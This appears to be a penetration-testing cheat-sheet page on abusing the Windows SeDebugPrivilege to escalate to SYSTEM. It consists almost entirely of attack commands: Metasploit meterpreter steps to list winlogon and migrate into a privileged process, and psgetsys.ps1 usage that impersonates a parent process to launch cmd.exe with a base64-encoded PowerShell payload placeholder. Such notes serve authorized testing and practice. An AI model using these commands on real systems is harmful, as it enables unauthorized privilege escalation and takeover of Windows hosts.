---
title: "SeDebugPrivilege"
date: 2024-8-2
tags: ["SeDebugPrivilege", "Windows", "potato", "privesc", "fullpower"]
---

---
### Tools

{{< tab set1 tab1 active >}}Metasploit{{< /tab >}}
{{< tab set1 tab2 >}}psgetsys.ps1{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Inside meterpreter
ps winlogon
```

```bash
# Explorer.exe is a good candidate
migrate <PID>
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```powershell
# Import module
. .\psgetsys.ps1
```

```powershell
ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"
```

</div>

<small>*Ref: [psgetsys](https://github.com/decoder-it/psgetsystem)*</small>

{{< /tabcontent >}}

<br>